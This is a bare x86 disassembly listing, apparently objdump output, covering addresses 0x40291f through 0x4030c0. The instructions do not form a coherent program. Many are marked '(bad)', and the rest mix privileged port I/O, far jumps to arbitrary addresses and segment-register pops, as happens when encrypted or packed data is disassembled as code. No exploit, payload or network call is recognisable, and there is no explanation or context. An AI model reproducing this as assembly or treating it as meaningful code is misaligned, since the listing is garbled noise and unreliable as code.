  40291f:	sti    
  402920:	pop    es
  402921:	sbb    ah,0x9e
  402924:	aad    0xd8
  402926:	loop   0x4028ef
  402928:	xchg   ebp,eax
  402929:	xor    BYTE PTR [esi+ecx*8+0x4f099211],ah
  402930:	sub    ah,BYTE PTR [ebx-0x66]
  402933:	es dec eax
  402935:	(bad)  
  402936:	jl     0x402947
  402938:	inc    esi
  402939:	jo     0x4029b2
  40293b:	mov    dl,0xf9
  40293d:	push   0x78
  40293f:	repz test DWORD PTR [ecx-0x3e],eax
  402943:	stos   BYTE PTR es:[edi],al
  402944:	stos   DWORD PTR es:[edi],eax
  402945:	xor    eax,0x7c9b7c55
  40294a:	mov    esi,0x720aeeac
  40294f:	push   ds
  402950:	jg     0x40295b
  402952:	push   0xce49f77b
  402957:	add    eax,DWORD PTR [ebx-0x14]
  40295a:	out    dx,al
  40295b:	enter  0xb509,0xca
  40295f:	push   eax
  402960:	xor    eax,0x8f871a5a
  402965:	les    edx,FWORD PTR [edi]
  402967:	and    esp,DWORD PTR [edx+ebp*4]
  40296a:	dec    esi
  40296b:	jmp    0xc2b0126f
  402970:	neg    DWORD PTR [ebp-0x44]
  402973:	pop    ebx
  402974:	bound  ebp,QWORD PTR [ebx+eax*1-0x2828837b]
  40297b:	xor    ah,cl
  40297d:	push   edx
  40297e:	fs xchg ecx,eax
  402980:	pop    ds
  402981:	test   al,0x37
  402983:	sbb    ah,dh
  402985:	data16 arpl WORD PTR [edi-0x6223962f],dx
  40298c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40298d:	jmp    0x45e4:0x9731b577
  402994:	xor    esp,ebp
  402996:	bound  ebp,QWORD PTR [eax-0x7c77e55b]
  40299c:	arpl   ax,cx
  40299e:	std    
  40299f:	dec    ecx
  4029a0:	push   ss
  4029a1:	mov    esp,0x363f042b
  4029a6:	stos   DWORD PTR es:[edi],eax
  4029a7:	ficom  DWORD PTR [ebx+0x34]
  4029aa:	int    0x2f
  4029ac:	xchg   esi,eax
  4029ad:	ins    BYTE PTR es:[edi],dx
  4029ae:	repnz imul edi,DWORD PTR [edi+0x2f8db325],0xffffff93
  4029b6:	mov    ch,0xc8
  4029b8:	call   0x7355f22c
  4029bd:	pop    esp
  4029be:	xchg   sp,ax
  4029c0:	and    ah,ah
  4029c2:	sbb    al,0x78
  4029c4:	outs   dx,DWORD PTR ds:[esi]
  4029c5:	cdq    
  4029c6:	and    BYTE PTR [edx],bl
  4029c8:	shl    DWORD PTR [ebp-0x56],1
  4029cb:	(bad)  
  4029cc:	jb     0x4029a6
  4029ce:	or     ecx,DWORD PTR [edi+edi*4+0x1b7c8f84]
  4029d5:	dec    edx
  4029d6:	into   
  4029d7:	push   esp
  4029d8:	mov    WORD PTR [esi+0x4afebae5],ds
  4029de:	or     ecx,DWORD PTR [edi]
  4029e0:	clc    
  4029e1:	dec    ebp
  4029e2:	stc    
  4029e3:	xchg   edx,eax
  4029e4:	popf   
  4029e5:	(bad)  
  4029e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029e7:	dec    edi
  4029e8:	or     eax,0xd154ee6e
  4029ed:	pushf  
  4029ee:	fld    QWORD PTR [ebx+eax*4+0x43]
  4029f2:	lds    ebx,FWORD PTR [esi]
  4029f4:	jmp    0x402983
  4029f6:	jae    0x402a01
  4029f8:	repz leave 
  4029fa:	cs pop eax
  4029fc:	mov    ebx,0xe5a34cb7
  402a01:	int3   
  402a02:	hlt    
  402a03:	mov    al,0x2e
  402a05:	pop    es
  402a06:	mov    dl,0x2
  402a08:	repnz jmp FWORD PTR [esp+ebp*8]
  402a0c:	in     al,0x53
  402a0e:	pop    ss
  402a0f:	jge    0x4029d4
  402a11:	pop    ecx
  402a12:	and    ah,dh
  402a14:	mov    al,0x50
  402a16:	pop    ds
  402a17:	les    eax,FWORD PTR [ebx+0x38be6d90]
  402a1d:	loopne 0x402a5a
  402a1f:	dec    edx
  402a20:	mov    eax,0x6ba61e8e
  402a25:	inc    ecx
  402a26:	mov    al,0x22
  402a28:	mov    ebx,0xb900aa95
  402a2d:	fnstsw WORD PTR [ecx]
  402a2f:	dec    ebx
  402a30:	shl    dh,0x73
  402a33:	popf   
  402a34:	xchg   DWORD PTR [ebp+eiz*1+0x7bd1b386],ebp
  402a3b:	mov    edx,0xa52cc31b
  402a40:	mov    ebx,0x654ab7ca
  402a45:	mov    eax,ds:0x2c13ea1b
  402a4a:	pushf  
  402a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4c:	ins    DWORD PTR es:[edi],dx
  402a4d:	out    0x61,al
  402a4f:	sbb    BYTE PTR [ebp+0x31e8073b],al
  402a55:	pop    eax
  402a56:	jmp    0x47c6dca7
  402a5b:	sub    DWORD PTR [edi],ebp
  402a5d:	pop    edi
  402a5e:	or     BYTE PTR [ecx-0x3b781a2d],bh
  402a64:	rcl    ch,cl
  402a66:	mov    bh,0xbf
  402a68:	das    
  402a69:	pushf  
  402a6a:	mov    eax,ds:0xe00dbd9f
  402a6f:	rcr    esi,0x44
  402a72:	retf   
  402a73:	cmc    
  402a74:	int3   
  402a75:	push   ss
  402a76:	dec    esp
  402a77:	and    al,0x59
  402a79:	dec    esp
  402a7a:	cmp    BYTE PTR [esi-0x599121a2],bh
  402a80:	out    0x80,al
  402a82:	leave  
  402a83:	fsubr  QWORD PTR [ebp-0x739fae24]
  402a89:	mov    ds:0x4fb4a004,al
  402a8e:	je     0x402a7f
  402a90:	into   
  402a91:	mov    bh,cl
  402a93:	es jmp 0x19430472
  402a99:	aaa    
  402a9a:	outs   dx,DWORD PTR ds:[esi]
  402a9b:	xor    ecx,DWORD PTR [ebp+0xe]
  402a9e:	and    eax,0xd22e34f
  402aa3:	(bad)  
  402aa4:	or     DWORD PTR [bp+di],ebp
  402aa7:	arpl   sp,bp
  402aa9:	dec    DWORD PTR [eax]
  402aab:	(bad)  
  402aac:	lods   eax,DWORD PTR ds:[esi]
  402aad:	push   ds
  402aae:	mov    ebp,0xea98af1b
  402ab3:	idiv   DWORD PTR [ebx+0x55]
  402ab6:	cwde   
  402ab7:	(bad)  
  402ab8:	jnp    0x402a7a
  402aba:	jp     0x402b07
  402abc:	bound  edi,QWORD PTR [edx-0x49]
  402abf:	xchg   ebp,eax
  402ac0:	push   ecx
  402ac1:	inc    ebx
  402ac2:	push   cs
  402ac3:	ror    BYTE PTR [ebp-0x1c],cl
  402ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ac7:	and    al,0x92
  402ac9:	repnz (bad) 
  402acb:	retf   0x8e97
  402ace:	leave  
  402acf:	push   es
  402ad0:	and    esi,DWORD PTR [esi]
  402ad2:	(bad)  
  402ad3:	cwde   
  402ad4:	mov    edi,ds
  402ad6:	xor    ecx,DWORD PTR [ebx-0x397b00d5]
  402adc:	push   esp
  402ade:	mov    ah,0x63
  402ae0:	add    esp,DWORD PTR [edi-0x2f]
  402ae3:	clc    
  402ae4:	mov    bh,0x31
  402ae6:	jno    0x402b4e
  402ae8:	mov    cl,dh
  402aea:	outs   dx,DWORD PTR ds:[esi]
  402aeb:	mov    ebx,0x70ec9b63
  402af0:	or     eax,0xea9797c6
  402af5:	in     al,dx
  402af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402af7:	enter  0xb7d8,0x40
  402afb:	bound  esp,QWORD PTR [edx+0x4e34961]
  402b01:	mov    al,0x75
  402b03:	fmul   DWORD PTR [eax-0x61]
  402b06:	fcom   DWORD PTR [edx+0x43ab85d4]
  402b0c:	pushf  
  402b0d:	and    eax,0x896fa762
  402b12:	jl     0x402ab4
  402b14:	test   DWORD PTR [edi],0x9c9d364a
  402b1a:	in     al,dx
  402b1b:	inc    ecx
  402b1c:	lock mov bl,0xaa
  402b1f:	test   eax,0x1f51e1f3
  402b24:	shr    BYTE PTR [esi-0x343638d0],cl
  402b2a:	jmp    0x402b39
  402b2c:	shr    DWORD PTR [edx+0x4f8cfa05],1
  402b32:	mov    edx,0x9b618b9
  402b37:	iret   
  402b38:	xor    edx,esi
  402b3a:	test   BYTE PTR [ebx-0x2f],dh
  402b3d:	cwde   
  402b3e:	pop    ebx
  402b3f:	push   es
  402b40:	out    dx,eax
  402b41:	inc    ebx
  402b42:	mov    DWORD PTR [ebx-0x29],ebp
  402b45:	popf   
  402b46:	adc    DWORD PTR [ecx],eax
  402b48:	imul   edx,DWORD PTR ds:[esi+0x6e],0x6870b798
  402b50:	jnp    0x402ae7
  402b52:	cmp    cl,BYTE PTR [edi+0x75]
  402b55:	mov    WORD PTR [edx],?
  402b57:	pop    esi
  402b58:	dec    ebp
  402b59:	jecxz  0x402b6f
  402b5b:	repz imul ebx,DWORD PTR [ecx+0x573b7e82],0x32
  402b63:	pusha  
  402b64:	or     eax,edi
  402b66:	cwde   
  402b67:	in     eax,dx
  402b68:	clc    
  402b69:	out    0xac,eax
  402b6b:	pusha  
  402b6c:	jecxz  0x402b9a
  402b6e:	lods   eax,DWORD PTR ds:[esi]
  402b6f:	frstor [edx+0x47c0d8a9]
  402b75:	aaa    
  402b76:	push   0x98281cb9
  402b7b:	sub    eax,0x90dd1868
  402b80:	inc    ebx
  402b81:	xchg   edx,eax
  402b82:	inc    esi
  402b83:	icebp  
  402b84:	lds    edi,FWORD PTR [edx]
  402b86:	and    edx,edi
  402b88:	cld    
  402b89:	dec    esp
  402b8a:	push   ss
  402b8b:	jmp    0x402be8
  402b8d:	jl     0x402bcd
  402b8f:	fidiv  DWORD PTR [edi]
  402b91:	mov    ecx,0xadcdd893
  402b96:	xor    al,0xe4
  402b98:	popa   
  402b99:	ror    BYTE PTR [ebx-0x263ad75d],1
  402b9f:	sub    al,0x26
  402ba1:	in     eax,0xac
  402ba3:	ret    0x3e88
  402ba6:	mov    ebp,DWORD PTR [eax]
  402ba8:	retf   0x5132
  402bab:	fdivr  DWORD PTR [eax]
  402bad:	lds    edx,FWORD PTR [edx]
  402baf:	jl     0x402b8b
  402bb1:	mov    esp,DWORD PTR [eax+0x5395856c]
  402bb7:	mov    ebx,0x266d259
  402bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bbd:	jle    0x402b7f
  402bbf:	fst    QWORD PTR [edx+0x5123de86]
  402bc5:	jmp    0x402ba1
  402bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bc8:	jne    0x402bbb
  402bca:	out    0xc6,al
  402bcc:	icebp  
  402bcd:	cmp    ebp,edx
  402bcf:	xor    eax,0x87b3aec2
  402bd4:	clc    
  402bd5:	mov    ds:0x6d6f3545,eax
  402bda:	adc    ebp,DWORD PTR [ebp+ecx*8+0x76167505]
  402be1:	aam    0x6f
  402be3:	mov    ds:0xe5b76360,eax
  402be8:	pop    eax
  402be9:	or     al,0x22
  402beb:	cwde   
  402bec:	scas   al,BYTE PTR es:[edi]
  402bed:	mov    es,edi
  402bef:	dec    esi
  402bf0:	cmp    ecx,DWORD PTR [edx+0x666bb45a]
  402bf6:	adc    al,0x70
  402bf8:	ret    0xb466
  402bfb:	sub    cl,BYTE PTR [esi+edx*8]
  402bfe:	jnp    0x402b8e
  402c00:	lods   al,BYTE PTR ds:[esi]
  402c01:	and    dl,BYTE PTR [ebp+0x6]
  402c04:	mov    ebp,0xa328988
  402c09:	jo     0x402c7e
  402c0b:	inc    ebx
  402c0c:	pop    esp
  402c0d:	inc    edx
  402c0e:	jne    0x402bf3
  402c10:	and    edx,DWORD PTR [ecx]
  402c12:	in     eax,dx
  402c13:	inc    edi
  402c14:	mov    ecx,0x6cb61283
  402c19:	int    0x4f
  402c1b:	inc    esi
  402c1c:	xor    BYTE PTR [ecx],ah
  402c1e:	sahf   
  402c1f:	out    dx,eax
  402c20:	int3   
  402c21:	pop    eax
  402c22:	call   0xf1ad7baa
  402c27:	fstp   st(3)
  402c29:	or     bl,BYTE PTR [eax+eax*4+0x51]
  402c2d:	jge    0x402bfc
  402c2f:	aam    0xb4
  402c31:	adc    al,0xe0
  402c33:	jmp    0x402bb8
  402c35:	stos   BYTE PTR es:[edi],al
  402c36:	fcomp  DWORD PTR [ebx]
  402c38:	xor    al,0xc7
  402c3a:	or     ebx,ecx
  402c3c:	push   ebx
  402c3d:	adc    al,0xd4
  402c3f:	sbb    al,0xea
  402c41:	lea    edx,[ebp+0x3b]
  402c44:	fild   QWORD PTR ds:0xc17acaa9
  402c4a:	add    al,BYTE PTR [edx-0x49]
  402c4d:	bswap  ebp
  402c4f:	mov    ds:0x891973b1,eax
  402c54:	das    
  402c55:	fldcw  WORD PTR [esp+ebp*4+0x45bad593]
  402c5c:	or     BYTE PTR cs:[ebx-0x4e75f429],0x33
  402c64:	scas   eax,DWORD PTR es:[edi]
  402c65:	sub    DWORD PTR [edi],ecx
  402c67:	mov    ds:0xf4d55828,al
  402c6c:	aaa    
  402c6d:	loopne 0x402c11
  402c6f:	xchg   esi,eax
  402c70:	loope  0x402c96
  402c72:	int3   
  402c73:	aas    
  402c74:	xchg   edi,eax
  402c75:	mov    edx,0x6d6b8266
  402c7a:	hlt    
  402c7b:	out    dx,al
  402c7c:	push   edx
  402c7d:	pop    ecx
  402c7e:	and    al,0xb4
  402c80:	lods   eax,DWORD PTR ds:[esi]
  402c81:	or     DWORD PTR [edi+0x494218fe],ecx
  402c87:	in     eax,0xc2
  402c89:	fsub   QWORD PTR [ecx]
  402c8b:	jo     0x402c49
  402c8d:	leave  
  402c8e:	mov    dl,0x6c
  402c90:	cmp    ch,ah
  402c92:	xchg   ebp,eax
  402c93:	enter  0x1a86,0x89
  402c97:	jnp    0x402ca3
  402c99:	in     al,0x7f
  402c9b:	in     al,dx
  402c9c:	dec    ebp
  402c9d:	mov    ah,0xfc
  402c9f:	clc    
  402ca0:	in     eax,0xfb
  402ca2:	mov    eax,ds:0x15860e2d
  402ca7:	call   0xa011:0xd4f6db7d
  402cae:	cmp    al,BYTE PTR [edx-0x31]
  402cb1:	inc    edx
  402cb2:	adc    ebx,ebp
  402cb4:	rcl    BYTE PTR [ebx],1
  402cb6:	and    ch,ch
  402cb8:	(bad)  
  402cb9:	int3   
  402cba:	mov    WORD PTR [ebp-0x7f],cs
  402cbd:	pop    esp
  402cbe:	and    BYTE PTR [edx+0x66],bl
  402cc1:	movd   esi,mm6
  402cc4:	ins    BYTE PTR es:[edi],dx
  402cc5:	sti    
  402cc6:	cmp    BYTE PTR ds:0x66d09357,0xb7
  402ccd:	test   DWORD PTR [esi],ebx
  402ccf:	mov    eax,0x89e1986c
  402cd4:	bound  ebp,QWORD PTR [ebx-0x68]
  402cd7:	sbb    eax,0x39ea4dce
  402cdc:	lea    ebp,[ecx-0x2b0565ba]
  402ce2:	ror    DWORD PTR [ecx+esi*2+0x5a],1
  402ce6:	push   ecx
  402ce7:	push   edi
  402ce8:	add    ebx,0xcd509acd
  402cee:	xchg   edi,eax
  402cef:	pop    ecx
  402cf0:	scas   eax,DWORD PTR es:[edi]
  402cf1:	xor    esi,DWORD PTR [ebp-0x59]
  402cf4:	pop    eax
  402cf5:	mov    edi,0x7241d9d6
  402cfa:	aas    
  402cfb:	lock and eax,0x97f614e0
  402d01:	cdq    
  402d02:	add    eax,0x15f6e0c7
  402d07:	or     ch,dl
  402d09:	sahf   
  402d0a:	dec    eax
  402d0b:	stos   DWORD PTR es:[edi],eax
  402d0c:	xchg   edi,eax
  402d0d:	push   0x84cd1e41
  402d12:	shl    bl,1
  402d14:	jle    0x402d08
  402d16:	retf   
  402d17:	jp     0x402cba
  402d19:	add    al,0x57
  402d1b:	or     eax,0xd0c2347c
  402d20:	xchg   ecx,ebx
  402d22:	cmc    
  402d23:	lgs    edx,FWORD PTR [edi-0x5c]
  402d27:	add    eax,0xa235e396
  402d2c:	and    BYTE PTR [eax-0x1b8ed7e],bl
  402d32:	or     dh,cl
  402d34:	dec    ebx
  402d35:	pop    ecx
  402d36:	fcomp  DWORD PTR [eax-0x30]
  402d39:	iret   
  402d3a:	gs mov ah,0xc9
  402d3d:	fldcw  WORD PTR [edi]
  402d3f:	or     ebx,esp
  402d41:	jo     0x402d5b
  402d43:	dec    BYTE PTR [eax+0x55]
  402d46:	mov    bl,0xef
  402d48:	test   DWORD PTR [ebx],0xadea7a4a
  402d4e:	or     bl,BYTE PTR [edx+0x2b]
  402d51:	and    al,0x8e
  402d53:	cli    
  402d54:	push   ecx
  402d55:	inc    esp
  402d56:	xor    BYTE PTR [ebx],cl
  402d58:	int    0x18
  402d5a:	loope  0x402cfe
  402d5c:	sar    DWORD PTR [ebx],0x58
  402d5f:	adc    edi,edi
  402d61:	push   ebx
  402d62:	inc    esp
  402d63:	loop   0x402cea
  402d65:	ins    BYTE PTR es:[edi],dx
  402d66:	mov    al,ds:0xc22f34d3
  402d6b:	bound  ebp,QWORD PTR [ebp+0x2a]
  402d6e:	pop    es
  402d6f:	dec    ecx
  402d70:	xchg   esp,eax
  402d71:	and    cl,BYTE PTR [ebp+0x243ef882]
  402d77:	cdq    
  402d78:	mov    ebp,0xb48d09ae
  402d7d:	int3   
  402d7e:	mov    DWORD PTR [eax*8+0x7e563252],ecx
  402d85:	vunpckhps xmm1,xmm3,XMMWORD PTR ss:[edi+0x3]
  402d8b:	pop    ecx
  402d8c:	dec    edi
  402d8d:	dec    BYTE PTR [eax-0x546a371d]
  402d93:	and    al,dl
  402d95:	scas   al,BYTE PTR es:[edi]
  402d96:	cmp    al,0x45
  402d98:	fucomi st,st(3)
  402d9a:	add    BYTE PTR ds:0x42eca28,dh
  402da0:	leave  
  402da1:	out    0x91,eax
  402da3:	loopne 0x402d59
  402da5:	pop    ds
  402da6:	cmp    dh,BYTE PTR [edi]
  402da8:	dec    ebp
  402da9:	sbb    cl,BYTE PTR [ecx-0x78]
  402dac:	jae    0x402d9f
  402dae:	test   DWORD PTR [edi+0x789d33dd],0xec100c1d
  402db8:	lods   al,BYTE PTR ds:[esi]
  402db9:	out    0x58,al
  402dbb:	xor    DWORD PTR [ebx-0x40],edi
  402dbe:	jl     0x402df9
  402dc0:	push   edx
  402dc1:	cld    
  402dc2:	mov    al,ds:0xb268b99
  402dc7:	mov    ebx,0xaed37688
  402dcc:	jl     0x402e45
  402dce:	or     eax,0xdb547e1b
  402dd3:	mov    cl,0xdb
  402dd5:	rol    BYTE PTR [ebx+eiz*4],1
  402dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dd9:	outs   dx,BYTE PTR ds:[esi]
  402dda:	in     al,0xf2
  402ddc:	xchg   edi,eax
  402ddd:	out    dx,al
  402dde:	enter  0x7e85,0x3b
  402de2:	add    BYTE PTR [ebp+0x659b76a4],al
  402de8:	outs   dx,DWORD PTR ds:[esi]
  402de9:	pop    ds
  402dea:	iret   
  402deb:	or     ecx,eax
  402ded:	mov    cl,0xda
  402def:	mov    edi,0x651eb807
  402df4:	jo     0x402e4e
  402df6:	sbb    edx,DWORD PTR [ecx+0x15d18903]
  402dfc:	mov    ebp,0xe1216156
  402e01:	loopne 0x402e7f
  402e03:	addr16 rol eax,0xdc
  402e07:	retf   
  402e08:	sub    ch,ch
  402e0a:	push   esp
  402e0b:	addr16 adc eax,0xea8a7af9
  402e11:	dec    esi
  402e12:	inc    edx
  402e13:	add    ah,dl
  402e15:	cmp    eax,edi
  402e17:	jb     0x402de3
  402e19:	mov    BYTE PTR [esi-0x44],ch
  402e1c:	(bad)  
  402e1d:	xchg   ecx,eax
  402e1e:	adc    eax,0x30282827
  402e23:	xchg   ebx,eax
  402e24:	inc    esp
  402e25:	(bad)  
  402e26:	scas   eax,DWORD PTR es:[edi]
  402e27:	mov    edi,0x96934dab
  402e2c:	inc    ebx
  402e2d:	rcl    DWORD PTR [edx-0x4d],1
  402e30:	xor    bh,BYTE PTR ss:[edx+eiz*2+0x449c0513]
  402e38:	scas   al,BYTE PTR es:[edi]
  402e39:	jo     0x402e7d
  402e3b:	dec    esp
  402e3c:	repnz inc ecx
  402e3e:	pop    ecx
  402e3f:	shr    BYTE PTR ss:[ecx+0x4e9522aa],1
  402e46:	mov    ds:0xe41c44f7,al
  402e4c:	pop    ecx
  402e4d:	mov    esp,0x19d27a56
  402e52:	arpl   cx,cx
  402e54:	jmp    0x402e65
  402e56:	jne    0x402e04
  402e58:	and    BYTE PTR [ebp-0x53],0x25
  402e5c:	adc    DWORD PTR [ecx-0x123af3b6],ecx
  402e62:	jbe    0x402edc
  402e64:	push   ss
  402e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e66:	ja     0x402e31
  402e68:	mov    ds:0xbde78ddc,eax
  402e6d:	add    esi,DWORD PTR [eax+0x34]
  402e70:	mov    eax,ds:0x4b17f6
  402e75:	inc    ebx
  402e76:	pop    ds
  402e77:	fiadd  WORD PTR [ecx-0x5ec5eb00]
  402e7d:	popa   
  402e7e:	ins    DWORD PTR es:[edi],dx
  402e7f:	aam    0x11
  402e81:	adc    eax,0x11e8f087
  402e86:	xchg   ebp,eax
  402e87:	jbe    0x402f06
  402e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e8a:	aad    0x5a
  402e8c:	sub    ah,al
  402e8e:	dec    eax
  402e8f:	jne    0x402f02
  402e91:	pop    ebp
  402e92:	outs   dx,DWORD PTR ds:[esi]
  402e93:	inc    edi
  402e94:	or     eax,edx
  402e96:	dec    esi
  402e97:	jg     0x402e59
  402e99:	cmp    cl,BYTE PTR [edx-0x64c4e3a8]
  402e9f:	out    0xb6,al
  402ea1:	cmc    
  402ea2:	or     cl,bh
  402ea4:	ret    0xfb5a
  402ea7:	push   esi
  402ea8:	pop    ds
  402ea9:	add    edi,DWORD PTR [ebp-0x9]
  402eac:	jle    0x402ecd
  402eae:	pop    eax
  402eaf:	mov    WORD PTR [esi+0x568d2080],gs
  402eb5:	fwait
  402eb6:	cmp    al,0xd7
  402eb8:	sub    edx,DWORD PTR [esp+ecx*2+0x541c0ad0]
  402ebf:	ss (bad) 
  402ec1:	rcr    BYTE PTR [esi+0x52d11769],0xfd
  402ec8:	sub    eax,0x4ac52f57
  402ecd:	in     eax,0x3c
  402ecf:	ret    0x36ee
  402ed2:	movaps XMMWORD PTR [eax+0x709c9568],xmm0
  402ed9:	out    0x79,al
  402edb:	aas    
  402edc:	add    al,0x1d
  402ede:	xor    edi,eax
  402ee0:	cmp    ah,ch
  402ee2:	xor    al,0x9a
  402ee4:	and    eax,0x2b528e6a
  402ee9:	sub    BYTE PTR [ebx],bh
  402eeb:	mov    dh,0x53
  402eed:	jne    0x402e86
  402eef:	outs   dx,DWORD PTR ds:[esi]
  402ef0:	and    al,0xec
  402ef2:	mov    eax,0x7bec1c3c
  402ef7:	enterw 0x1c6a,0x11
  402efc:	push   edi
  402efd:	into   
  402efe:	cmp    esi,DWORD PTR [edi]
  402f00:	inc    edx
  402f01:	sbb    BYTE PTR [ecx+0x54791064],ah
  402f07:	arpl   WORD PTR [esi+esi*1-0x6],si
  402f0b:	jno    0x402eb4
  402f0d:	test   BYTE PTR [ebx+0x1e8444b9],cl
  402f13:	jmp    0xa25b012a
  402f18:	mov    edi,0x4762294c
  402f1d:	mov    esp,edx
  402f1f:	push   cs
  402f20:	pop    ss
  402f21:	xchg   ecx,eax
  402f22:	fs push 0x7f
  402f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f26:	push   esi
  402f27:	or     esi,DWORD PTR [esi-0x58afb3f6]
  402f2d:	clc    
  402f2e:	cdq    
  402f2f:	lea    ebx,[ecx+eiz*8]
  402f32:	jp     0x402fa7
  402f34:	jp     0x402f18
  402f36:	cmp    eax,0x1573a494
  402f3b:	xchg   ecx,eax
  402f3c:	or     al,0xd7
  402f3e:	push   edx
  402f3f:	push   ds
  402f40:	xchg   esp,eax
  402f41:	xor    al,0x5c
  402f43:	lock inc ecx
  402f45:	pop    edi
  402f46:	jne    0x402f13
  402f48:	dec    ebx
  402f49:	lea    esp,[edi]
  402f4b:	mov    ch,0x9b
  402f4d:	fsubrp st(1),st
  402f4f:	lods   eax,DWORD PTR ds:[esi]
  402f50:	xchg   edi,eax
  402f51:	mov    eax,0xdb2d63bf
  402f56:	xor    DWORD PTR [ecx],ecx
  402f58:	(bad)  
  402f59:	(bad)  
  402f5a:	mov    eax,0xb2136a13
  402f5f:	mov    cl,0x20
  402f61:	add    ebx,DWORD PTR [ebx+0x7]
  402f64:	push   cs
  402f65:	pop    edx
  402f66:	rcr    DWORD PTR [edi],1
  402f68:	mov    dl,0x77
  402f6a:	outs   dx,DWORD PTR ds:[esi]
  402f6b:	mov    ebp,0x57c5debf
  402f70:	outs   dx,BYTE PTR ds:[esi]
  402f71:	dec    ebp
  402f72:	sub    esi,ebp
  402f74:	stos   BYTE PTR es:[edi],al
  402f75:	cmp    ebx,ecx
  402f77:	dec    eax
  402f78:	dec    ebp
  402f79:	push   eax
  402f7a:	mov    ah,0x44
  402f7c:	adc    ebx,DWORD PTR [ecx+0x37591fb8]
  402f82:	mov    ds:0x48e7987e,al
  402f87:	adc    al,BYTE PTR [ecx+0x7b]
  402f8a:	rcr    DWORD PTR [ebx+0x752bcc5a],cl
  402f90:	(bad)  
  402f91:	out    0xbe,al
  402f93:	xchg   BYTE PTR [eax+ebp*8],dh
  402f96:	xchg   BYTE PTR [ebx+0x4cff0c36],dh
  402f9c:	in     al,0xed
  402f9e:	(bad)  
  402f9f:	cli    
  402fa0:	or     esp,eax
  402fa2:	je     0x402fc8
  402fa4:	push   ss
  402fa5:	dec    ebp
  402fa6:	mov    WORD PTR [eax],ss
  402fa8:	int    0x35
  402faa:	xchg   edi,eax
  402fab:	mov    cl,0x93
  402fad:	inc    edi
  402fae:	mov    edx,0x57c2f0d5
  402fb3:	pop    ds
  402fb4:	sub    eax,0x15a298ac
  402fb9:	and    BYTE PTR [edi-0xddbec86],0x77
  402fc0:	pop    edx
  402fc1:	mov    ebx,0x1718ff82
  402fc6:	clc    
  402fc7:	in     al,0xff
  402fc9:	outs   dx,DWORD PTR ds:[esi]
  402fca:	lahf   
  402fcb:	std    
  402fcc:	sub    eax,0xbff31aed
  402fd1:	cmp    BYTE PTR ds:0xc9e1a694,dl
  402fd7:	pop    esp
  402fd8:	add    DWORD PTR [ecx+0x5e],ecx
  402fdb:	stos   DWORD PTR es:[edi],eax
  402fdc:	pusha  
  402fdd:	out    0x8e,eax
  402fdf:	ror    ch,cl
  402fe1:	pusha  
  402fe2:	mov    ebx,0x72a72199
  402fe7:	jmp    0x402fc6
  402fe9:	inc    esp
  402fea:	and    esi,DWORD PTR [esp+eiz*8-0x2e]
  402fee:	std    
  402fef:	and    ch,bh
  402ff1:	fnsave [edi-0x68cef481]
  402ff7:	mov    bl,0x1e
  402ff9:	xchg   ebp,eax
  402ffa:	in     al,dx
  402ffb:	or     al,0xf
  402ffd:	rcl    DWORD PTR [ecx],0xa1
  403000:	xchg   BYTE PTR [esi-0x2586eaeb],dl
  403006:	mov    al,0x13
  403008:	dec    esi
  403009:	and    ch,BYTE PTR [edi]
  40300b:	xchg   ebp,eax
  40300c:	xor    eax,0xe083704f
  403011:	or     edi,DWORD PTR [esi]
  403013:	jae    0x403025
  403015:	adc    ch,BYTE PTR [ecx+0x36c9708c]
  40301b:	pop    esi
  40301c:	cld    
  40301d:	(bad)  
  40301e:	ja     0xf8f7fb21
  403024:	(bad)  
  403026:	(bad)  
  403027:	jmp    0x403040
  403029:	push   ds
  40302a:	or     bh,bl
  40302c:	pop    edx
  40302d:	add    eax,0xcee6b653
  403032:	sbb    bl,0x33
  403035:	leave  
  403036:	push   es
  403037:	jg     0x403017
  403039:	pushf  
  40303a:	sbb    BYTE PTR [ebp-0x2c],dl
  40303d:	push   ecx
  40303e:	retf   
  40303f:	pusha  
  403040:	iret   
  403041:	or     DWORD PTR [esi],0xd
  403044:	cdq    
  403045:	dec    eax
  403046:	add    esi,esp
  403048:	jl     0x403082
  40304a:	cmp    dl,cl
  40304c:	scas   al,BYTE PTR es:[edi]
  40304d:	pusha  
  40304e:	hlt    
  40304f:	pushf  
  403050:	push   esi
  403051:	or     al,0x88
  403053:	arpl   WORD PTR [esi+0x75],si
  403056:	xor    bh,BYTE PTR [ebx-0x63]
  403059:	jmp    0x40307f
  40305b:	das    
  40305c:	repz jbe 0x40302a
  40305f:	xchg   DWORD PTR [ecx+eiz*2+0x9],edx
  403063:	icebp  
  403064:	mov    eax,0x6dc47a4a
  403069:	pusha  
  40306a:	mov    ecx,0x71f4e83f
  40306f:	inc    esp
  403070:	xchg   esp,eax
  403071:	jno    0x4030e0
  403073:	std    
  403074:	inc    ecx
  403075:	out    0xa2,al
  403077:	daa    
  403078:	cli    
  403079:	or     BYTE PTR [bp+si],0x35
  40307d:	cmp    BYTE PTR [ebp+0x18a5ed57],ah
  403083:	fbld   TBYTE PTR es:[edx-0x62729a27]
  40308a:	stos   BYTE PTR es:[edi],al
  40308b:	into   
  40308c:	and    esp,DWORD PTR [edx+0x30ad117]
  403092:	daa    
  403093:	stos   DWORD PTR es:[edi],eax
  403094:	xchg   esi,eax
  403095:	xor    eax,DWORD PTR [edi]
  403097:	ret    0xb476
  40309a:	stos   BYTE PTR es:[edi],al
  40309b:	xchg   ecx,eax
  40309c:	jo     0x4030db
  40309e:	rol    ebx,cl
  4030a0:	jb     0x40307b
  4030a2:	push   ds
  4030a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a4:	sub    dl,BYTE PTR [ebx+0x297a7fb8]
  4030aa:	xchg   esp,eax
  4030ab:	and    eax,0x4dab69a2
  4030b0:	pop    esp
  4030b1:	mov    edx,0x4d58949b
  4030b6:	mov    ebp,0x3b6cc4d
  4030bb:	mov    esi,0xce0cee07
  4030c0:	jmp    0x40307e
